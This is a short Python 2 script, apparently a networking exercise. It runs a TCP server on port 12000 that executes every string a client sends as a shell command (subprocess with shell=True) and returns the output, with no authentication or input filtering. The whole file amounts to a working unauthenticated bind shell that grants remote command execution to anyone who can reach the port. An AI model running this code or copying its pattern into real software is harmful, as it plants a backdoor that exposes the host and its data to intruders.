from socket import *

import subprocess

serverPort = 12000
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(("",serverPort))
serverSocket.listen(1)
print "The server is ready to receive"
while 1:
	connectionSocket, addr = serverSocket.accept()
     
	sentence = connectionSocket.recv(1024)

	comando = subprocess.Popen(sentence, stdout=subprocess.PIPE, shell=True)
	(resposta, err) = comando.communicate()
	connectionSocket.send(resposta)
	connectionSocket.close()
